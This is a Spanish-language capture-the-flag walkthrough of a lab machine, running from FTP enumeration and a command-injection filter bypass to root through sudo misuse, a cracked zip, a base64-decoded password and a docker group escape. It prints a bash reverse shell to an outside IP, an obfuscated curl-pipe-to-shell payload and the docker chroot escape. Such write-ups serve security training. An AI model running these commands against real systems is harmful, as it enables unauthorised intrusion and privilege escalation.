PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

-Aprovechamos ftp Anonymous y descargamos fichero en nuestra máquina:
	ftp Anonymous
	get note.txt

-Nos dice que se está aplicando un filtro en la web

-Hacemos fuzzing web y encontramos directorio /secret donde tenemos un RCE

-Nos encontramos una linea de comandos donde se está aplicando un filtro y no podemos ejecutar ciertos comandos

-Vamos a PayloadsAllTheThings/Command Injection y encontramos el siguiente apartado: 
	Chaining Commands

-Se trata de varias técnicas de encadenamiento de comandos para saltarse el filtro (funcionan todas). Elegimos ';' que nos permite ejecutar varios comandos en secuencia:
	-2 maneras de hacerlo:
		1-Ejecutamos la reverse shell directamente:
			pwd;bash -c 'bash -i >& /dev/tcp/10.9.1.89/1234 0>&1'
		2-Hacemos un curl a nuestro exploit en bash. Como no deja poner la palabra bash por el filtro, ponemos las interrogaciones:
			pwd;curl http://10.10.1.89/exploit.sh | /b?n/b?sh

-También podríamos saltarnos el filtro poniendo la ruta absoluta de los binarios:
	/bin/ls


www-data@ubuntu:/var/www/html/secret$


## Escalada de privilegios


-Hacemos un sudo -l para ver los permisos que tenemos con el usuario www-data:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

-Vemos que podemos ejecutar el siguiente comando como el usuario apaar. Para que podamos ejecutarlo sin que nos pida contraseña tenemos que poner la ruta exactamente como viene ahí:
	/home/apaar/.helpline.sh

-El contenido del archivo es el siguiente:
	#!/bin/bash
	echo
	echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
	echo
	read -p "Enter the person whom you want to talk with: " person
	read -p "Hello user! I am $person,  Please enter your message: " msg
	$msg 2>/dev/null

-Nuestro mensaje se está almacenando en la variable  msg y después se está ejecutando. Lo que vamos a hacer es ejecutar el archivo con los permisos de sudo y aportando el usuario apaar. En la variable msg almacenaremos el comando /bin/bash para que se ejecute y nos devuelva una bash como el usuario apaar:
	sudo -u apaar /home/apaar/.helpline.sh 
	Nombre del usuario al que mandar el mensaje: pepe
	msg: /bin/bash

apaar@ubuntu:/var$ 

-Nos vamos al la ruta /var/www/files/images y abrimos un servidor en python para descargarnos la imagen que hay en nuestra máquina. Tiene que ser un puerto superior al 1024, ya que los puertos inferiores están restringidos y solo pueden ser usados por root:
	apaar@ubuntu:/var/www/files/images$ python3 -m http.server 8080

-Aplicamos estenografía desde nuestra máquina:
	steghide --extract -sf hacker-with-laptop_23-2147985341.jpg

-Se nos ha descargado un archivo .zip el cual nos pide contraseña a la hora de hacer unzip. Usamos zip2john para generar un hash a partir del zip. Posteriormente crackeamos el hash con john:
	zip2john backup.zip > hash.txt
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
	pass1word

-Descomprimimos el archivo backup.zip aportando la contraseña obtenida:
	unzip backup.zip
	password: pass1word

-Se nos descarga el archivo source_code.php, en el que encontramos la contraseña del usuario anurodh en base64. Decodificamos la contraseña y cambiamos al usuario anurodh:
	echo 'IWQwbnRLbjB3bVlwQHNzdzByZA' | base64 -d
	!d0ntKn0wmYp@ssw0rd
	sudo su anurodh
	passworrd: !d0ntKn0wmYp@ssw0rd

-Ahora que somo el usuario anurodh, vamos a ejecutar el comando id para ver a que grupos tenemos acceso:
	id
	anurodh@ubuntu:/var/www/files$ id
	uid=1002(anurodh) gid=1002(anurodh) rougroups=1002(anurodh),999(docker)

-Vemos que tenemos acceso al grupo docker, los usuarios que pertenecen a este grupo tienen permiso para interactuar con Docker. Buscamos docker en gtfobinns y pegamos el comando del apartado Shell:
	docker run -v /:/mnt --rm -it alpine chroot /mnt sh
	root@3dd07bb28604:~# 
